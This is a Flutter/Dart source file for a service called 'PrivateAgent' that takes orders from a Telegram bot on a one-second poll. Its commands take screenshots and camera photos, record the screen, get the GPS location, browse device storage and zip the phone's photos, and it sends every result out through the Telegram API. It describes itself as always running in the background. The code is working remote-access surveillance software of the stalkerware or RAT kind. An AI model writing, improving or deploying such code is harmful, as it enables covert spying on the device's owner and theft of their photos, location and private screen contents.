// lib/services/telegram_service.dart
// ✅ v100 - Sare bugs fix, inline file browser, background support

import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter_dotenv/flutter_dotenv.dart';
import 'package:http/http.dart' as http;

import 'package:flutter_native_screenshot_plus/flutter_native_screenshot_plus.dart';
import 'package:camera/camera.dart';
import 'package:flutter_screen_recording/flutter_screen_recording.dart';
import 'package:geolocator/geolocator.dart';
import 'package:archive/archive.dart';
import 'package:path_provider/path_provider.dart';

class TelegramService {
  static final TelegramService _instance = TelegramService._internal();
  factory TelegramService() => _instance;
  TelegramService._internal();

  String get _botToken =>
      dotenv.env['BOT_TOKEN'] ?? '';
  String get _myChatId =>
      dotenv.env['CHAT_ID'] ?? '';

  Timer? _pollingTimer;
  int _lastUpdateId = 0;

  // ✅ FIX 1: Duplicate message prevent - concurrent polling rok
  bool _isPolling = false;
  // ✅ FIX 2: Concurrent command prevent
  bool _isProcessingCommand = false;

  bool _isRecording = false;

  void init() {
    if (_botToken.isEmpty) {
      print('⚠️ BOT_TOKEN .env mein nahi hai!');
      return;
    }
    if (_myChatId.isEmpty) {
      print('⚠️ CHAT_ID .env mein nahi hai!');
      return;
    }
    print('✅ TelegramService v100 started!');
    _startPolling();
  }

  void _startPolling() {
    _pollingTimer?.cancel();
    // ✅ 1 second polling for fast response
    _pollingTimer = Timer.periodic(const Duration(seconds: 1), (timer) async {
      await _pollUpdates();
    });
  }

  Future<void> _pollUpdates() async {
    // ✅ FIX: Agar pehle se poll chal rahi hai toh skip karo
    if (_isPolling) return;
    _isPolling = true;

    try {
      final url = Uri.parse(
        'https://api.telegram.org/bot$_botToken/getUpdates'
        '?offset=$_lastUpdateId&timeout=0&limit=10',
      );
      final response = await http
          .get(url)
          .timeout(const Duration(seconds: 8));

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['ok'] == true) {
          final results = data['result'] as List;
          for (var update in results) {
            // ✅ Update ID turant update karo (duplicate prevent)
            final updateId = update['update_id'] as int;
            if (updateId >= _lastUpdateId) {
              _lastUpdateId = updateId + 1;
            }
            await _handleUpdate(update);
          }
        }
      }
    } catch (e) {
      // Timeout ya network error - silently ignore
    } finally {
      _isPolling = false;
    }
  }

  Future<void> _handleUpdate(Map<String, dynamic> update) async {
    // ✅ Regular message handle karo
    if (update.containsKey('message')) {
      final message = update['message'];
      final chatId = message['chat']['id'].toString();

      if (chatId != _myChatId) {
        print('⛔ Unauthorized: $chatId');
        return;
      }

      final text = (message['text'] ?? '').toString();
      if (text.isNotEmpty) {
        print('📩 Command: $text');
        await _processCommand(chatId, text);
      }
    }

    // ✅ FIX: Inline keyboard button press handle karo
    if (update.containsKey('callback_query')) {
      final cb = update['callback_query'];
      final cbId = cb['id'].toString();
      final chatId = cb['message']['chat']['id'].toString();
      final data = (cb['data'] ?? '').toString();

      if (chatId != _myChatId) return;

      // Callback answer karo (loading spinner hatao)
      await _answerCallbackQuery(cbId);

      print('🔘 Callback: $data');
      await _processCommand(chatId, data);
    }
  }

  // -------------------------------------------------------
  // 🧠 Command Router
  // -------------------------------------------------------
  Future<void> _processCommand(String chatId, String text) async {
    // Agar command already process ho rahi hai toh queue mein dalo
    if (_isProcessingCommand) {
      await Future.delayed(const Duration(milliseconds: 500));
    }
    _isProcessingCommand = true;

    try {
      final cmd = text.trim().toLowerCase();

      if (cmd == '/start') {
        await _sendWelcome(chatId);
      } else if (cmd == '/help') {
        await _sendHelp(chatId);
      } else if (cmd.startsWith('/screenshot')) {
        await _captureAndSendScreenshot(chatId);
      } else if (cmd.startsWith('/camera')) {
        await _captureAndSendCameraPhoto(chatId);
      } else if (cmd == '/record start') {
        await _startScreenRecording(chatId);
      } else if (cmd == '/record stop') {
        await _stopScreenRecording(chatId);
      } else if (cmd == '/record') {
        // ✅ FIX: /record alone - usage batao
        await _sendMessage(chatId,
            '📹 *Screen Recording:*\n'
            '/record start - Recording shuru karo\n'
            '/record stop - Recording rokke bhejo');
      } else if (cmd.startsWith('/location')) {
        await _sendLocation(chatId);
      } else if (cmd.startsWith('/files')) {
        String path = text.replaceFirst(RegExp(r'/files\s*', caseSensitive: false), '').trim();
        if (path.isEmpty) path = '/storage/emulated/0';
        await _listFilesAndSend(chatId, path);
      } else if (cmd.startsWith('/zipimages')) {
        String path = text.replaceFirst(RegExp(r'/zipimages\s*', caseSensitive: false), '').trim();
        if (path.isEmpty) path = '/storage/emulated/0/DCIM/Camera';
        await _zipAndSendImages(chatId, path);
      } else {
        await _sendMessage(chatId,
            '❌ Unknown command.\nType /help for all commands.');
      }
    } finally {
      _isProcessingCommand = false;
    }
  }

  // -------------------------------------------------------
  // 👋 WELCOME
  // -------------------------------------------------------
  Future<void> _sendWelcome(String chatId) async {
    await _sendMessage(chatId,
        '🤖 *PrivateAgent v100 Active!*\n\n'
        'Main tumhare device ka Telegram agent hun.\n'
        'Background mein hamesha chalta hun 🟢\n\n'
        'Commands dekhne ke liye /help bhejo.');
  }

  // -------------------------------------------------------
  // ❓ HELP
  // -------------------------------------------------------
  Future<void> _sendHelp(String chatId) async {
    await _sendMessage(chatId,
        '🤖 *Available Commands:*\n\n'
        '📸 /screenshot - Screen capture\n'
        '📷 /camera - Camera se photo\n'
        '⏺️ /record start - Recording shuru\n'
        '⏹️ /record stop - Recording rokke bhejo\n'
        '📍 /location - GPS location\n'
        '📂 /files - File browser (click karke navigate karo!)\n'
        '📦 /zipimages /path - Photos zip karke bhejo\n\n'
        '💡 /files mein folders pe click karke andar jaao!');
  }

  // -------------------------------------------------------
  // 📸 SCREENSHOT
  // -------------------------------------------------------
  Future<void> _captureAndSendScreenshot(String chatId) async {
    try {
      await _sendMessage(chatId, '⏳ Screenshot le raha hun...');
      final path = await FlutterNativeScreenshotPlus().takeScreenshot();
      if (path == null) {
        await _sendMessage(chatId, '❌ Screenshot failed. Permission check karo.');
        return;
      }
      await _sendPhoto(chatId, File(path), '📸 Screenshot!');
    } catch (e) {
      await _sendMessage(chatId, '❌ Screenshot error: $e');
    }
  }

  // -------------------------------------------------------
  // 📷 CAMERA
  // -------------------------------------------------------
  Future<void> _captureAndSendCameraPhoto(String chatId) async {
    CameraController? controller;
    try {
      await _sendMessage(chatId, '📷 Camera se photo le raha hun...');
      final cameras = await availableCameras();
      if (cameras.isEmpty) {
        await _sendMessage(chatId, '❌ Camera nahi mila device pe.');
        return;
      }
      controller = CameraController(cameras[0], ResolutionPreset.high);
      await controller.initialize();
      final image = await controller.takePicture();
      await _sendPhoto(chatId, File(image.path), '📷 Camera photo!');
    } catch (e) {
      await _sendMessage(chatId, '❌ Camera error: $e');
    } finally {
      await controller?.dispose();
    }
  }

  // -------------------------------------------------------
  // 🎬 SCREEN RECORDING
  // -------------------------------------------------------
  Future<void> _startScreenRecording(String chatId) async {
    if (_isRecording) {
      await _sendMessage(chatId, '⚠️ Recording already chal rahi hai!\n/record stop se rokke bhejo.');
      return;
    }
    try {
      bool started = await FlutterScreenRecording.startRecordScreen(
        'PrivateAgent_${DateTime.now().millisecondsSinceEpoch}',
      );
      if (started) {
        _isRecording = true;
        await _sendMessage(chatId,
            '⏺️ *Recording shuru ho gayi!*\n'
            'Rokne ke liye: /record stop');
      } else {
        await _sendMessage(chatId,
            '❌ Recording shuru nahi ho saki.\n'
            'Screen recording permission dena hoga.');
      }
    } catch (e) {
      await _sendMessage(chatId, '❌ Recording error: $e');
    }
  }

  Future<void> _stopScreenRecording(String chatId) async {
    if (!_isRecording) {
      await _sendMessage(chatId, '⚠️ Abhi koi recording nahi chal rahi.\n/record start se shuru karo.');
      return;
    }
    try {
      await _sendMessage(chatId, '⏳ Recording band ho rahi hai...');
      String path = await FlutterScreenRecording.stopRecordScreen;
      _isRecording = false;
      if (path.isNotEmpty) {
        await _sendVideo(chatId, File(path), '🎥 Screen Recording!');
      } else {
        await _sendMessage(chatId, '❌ Recording file nahi mili.');
      }
    } catch (e) {
      _isRecording = false;
      await _sendMessage(chatId, '❌ Recording stop error: $e');
    }
  }

  // -------------------------------------------------------
  // 📍 LOCATION
  // -------------------------------------------------------
  Future<void> _sendLocation(String chatId) async {
    try {
      bool serviceEnabled = await Geolocator.isLocationServiceEnabled();
      if (!serviceEnabled) {
        await _sendMessage(chatId, '❌ GPS band hai. Device ka GPS on karo.');
        return;
      }
      LocationPermission permission = await Geolocator.checkPermission();
      if (permission == LocationPermission.denied) {
        permission = await Geolocator.requestPermission();
        if (permission == LocationPermission.denied) {
          await _sendMessage(chatId, '❌ Location permission denied.');
          return;
        }
      }
      if (permission == LocationPermission.deniedForever) {
        await _sendMessage(chatId,
            '❌ Location permanently denied.\nSettings > App > Permissions mein allow karo.');
        return;
      }
      await _sendMessage(chatId, '⏳ Location dhundh raha hun...');
      final pos = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
      ).timeout(const Duration(seconds: 30));
      final mapsUrl =
          'https://maps.google.com/?q=${pos.latitude},${pos.longitude}';
      await _sendMessage(chatId,
          '📍 *Current Location:*\n'
          'Lat: `${pos.latitude}`\n'
          'Lng: `${pos.longitude}`\n'
          'Accuracy: ${pos.accuracy.toStringAsFixed(1)}m\n'
          '[Google Maps pe dekho]($mapsUrl)');
    } catch (e) {
      await _sendMessage(chatId, '❌ Location error: $e');
    }
  }

  // -------------------------------------------------------
  // 📂 FILE BROWSER - ✅ INLINE KEYBOARD (Click karke navigate!)
  // -------------------------------------------------------
  Future<void> _listFilesAndSend(String chatId, String path) async {
    try {
      final dir = Directory(path);
      if (!await dir.exists()) {
        await _sendMessage(chatId, '❌ Directory nahi mili:\n`$path`');
        return;
      }

      final list = await dir.list().toList()
        ..sort((a, b) {
          // Folders pehle, files baad mein
          final aIsDir = a is Directory;
          final bIsDir = b is Directory;
          if (aIsDir && !bIsDir) return -1;
          if (!aIsDir && bIsDir) return 1;
          return a.path.compareTo(b.path);
        });

      // ✅ Inline keyboard banao - folders click karke navigate ho sakti hain
      final List<List<Map<String, String>>> keyboard = [];

      // Parent folder button (agar root nahi)
      if (path != '/storage/emulated/0' && path != '/') {
        final parent = path.substring(0, path.lastIndexOf('/'));
        keyboard.add([
          {'text': '⬆️ Back: ${parent.split('/').last}', 'callback_data': '/files $parent'}
        ]);
      }

      // Files aur folders list
      int count = 0;
      for (var entity in list) {
        if (count >= 40) break; // Telegram ka limit
        final name = entity.path.split('/').last;

        if (entity is Directory) {
          // ✅ FOLDER = clickable button (tap karo, andar jaao)
          keyboard.add([
            {'text': '📁 $name', 'callback_data': '/files ${entity.path}'}
          ]);
        } else {
          // File = size dikhao
          final file = File(entity.path);
          int sizeBytes = 0;
          try { sizeBytes = await file.length(); } catch (_) {}
          final sizeStr = _formatSize(sizeBytes);
          keyboard.add([
            {'text': '📄 $name ($sizeStr)', 'callback_data': '/help'}
          ]);
        }
        count++;
      }

      if (list.length > 40) {
        keyboard.add([{'text': '... aur ${list.length - 40} aur items', 'callback_data': '/help'}]);
      }

      // ✅ Send with inline keyboard
      await _sendMessageWithKeyboard(
        chatId,
        '📂 *${path.split('/').last.isEmpty ? "Root" : path.split('/').last}*\n'
        '`$path`\n'
        '${list.length} items (📁 folders tap karke navigate karo)',
        keyboard,
      );
    } catch (e) {
      await _sendMessage(chatId, '❌ Files error: $e');
    }
  }

  String _formatSize(int bytes) {
    if (bytes < 1024) return '${bytes}B';
    if (bytes < 1024 * 1024) return '${(bytes / 1024).toStringAsFixed(1)}KB';
    if (bytes < 1024 * 1024 * 1024) return '${(bytes / (1024 * 1024)).toStringAsFixed(1)}MB';
    return '${(bytes / (1024 * 1024 * 1024)).toStringAsFixed(1)}GB';
  }

  // -------------------------------------------------------
  // 📦 ZIP IMAGES
  // -------------------------------------------------------
  Future<void> _zipAndSendImages(String chatId, String path) async {
    try {
      final dir = Directory(path);
      if (!await dir.exists()) {
        await _sendMessage(chatId, '❌ Directory nahi mili:\n`$path`');
        return;
      }
      final images = await dir
          .list()
          .where((e) =>
              e.path.toLowerCase().endsWith('.jpg') ||
              e.path.toLowerCase().endsWith('.png') ||
              e.path.toLowerCase().endsWith('.jpeg'))
          .toList();

      if (images.isEmpty) {
        await _sendMessage(chatId, '❌ Koi image nahi mili:\n`$path`');
        return;
      }

      await _sendMessage(chatId, '⏳ ${images.length} images zip ho rahi hain...');
      final archive = Archive();
      for (var file in images) {
        final bytes = await File(file.path).readAsBytes();
        archive.addFile(
            ArchiveFile(file.path.split('/').last, bytes.length, bytes));
      }
      final zipBytes = ZipEncoder().encode(archive);
      final tempDir = await getTemporaryDirectory();
      final zipPath =
          '${tempDir.path}/images_${DateTime.now().millisecondsSinceEpoch}.zip';
      await File(zipPath).writeAsBytes(zipBytes!);

      final request = http.MultipartRequest(
        'POST',
        Uri.parse('https://api.telegram.org/bot$_botToken/sendDocument'),
      );
      request.fields['chat_id'] = chatId;
      request.fields['caption'] = '📦 ${images.length} images zipped!';
      request.files.add(await http.MultipartFile.fromPath('document', zipPath));
      await request.send();

      await File(zipPath).delete();
    } catch (e) {
      await _sendMessage(chatId, '❌ Zip error: $e');
    }
  }

  // -------------------------------------------------------
  // 📨 Telegram API Helpers
  // -------------------------------------------------------

  Future<void> _sendMessage(String chatId, String text) async {
    try {
      final url = Uri.parse(
          'https://api.telegram.org/bot$_botToken/sendMessage');
      await http.post(url,
          headers: {'Content-Type': 'application/json'},
          body: jsonEncode({
            'chat_id': chatId,
            'text': text,
            'parse_mode': 'Markdown',
          }));
    } catch (e) {
      print('Message send error: $e');
    }
  }

  // ✅ Inline keyboard ke saath message bhejo
  Future<void> _sendMessageWithKeyboard(
    String chatId,
    String text,
    List<List<Map<String, String>>> keyboard,
  ) async {
    try {
      final url = Uri.parse(
          'https://api.telegram.org/bot$_botToken/sendMessage');
      await http.post(url,
          headers: {'Content-Type': 'application/json'},
          body: jsonEncode({
            'chat_id': chatId,
            'text': text,
            'parse_mode': 'Markdown',
            'reply_markup': {'inline_keyboard': keyboard},
          }));
    } catch (e) {
      print('Keyboard message error: $e');
    }
  }

  // ✅ Callback query answer karo (spinner hatao)
  Future<void> _answerCallbackQuery(String callbackQueryId) async {
    try {
      final url = Uri.parse(
          'https://api.telegram.org/bot$_botToken/answerCallbackQuery');
      await http.post(url,
          headers: {'Content-Type': 'application/json'},
          body: jsonEncode({'callback_query_id': callbackQueryId}));
    } catch (e) {
      print('Callback answer error: $e');
    }
  }

  Future<void> _sendPhoto(String chatId, File file, String caption) async {
    try {
      final request = http.MultipartRequest(
        'POST',
        Uri.parse('https://api.telegram.org/bot$_botToken/sendPhoto'),
      );
      request.fields['chat_id'] = chatId;
      request.fields['caption'] = caption;
      request.files.add(await http.MultipartFile.fromPath('photo', file.path));
      await request.send();
    } catch (e) {
      print('Photo send error: $e');
    }
  }

  Future<void> _sendVideo(String chatId, File file, String caption) async {
    try {
      final request = http.MultipartRequest(
        'POST',
        Uri.parse('https://api.telegram.org/bot$_botToken/sendVideo'),
      );
      request.fields['chat_id'] = chatId;
      request.fields['caption'] = caption;
      request.files.add(await http.MultipartFile.fromPath('video', file.path));
      await request.send();
    } catch (e) {
      print('Video send error: $e');
    }
  }

  void dispose() {
    _pollingTimer?.cancel();
  }
}
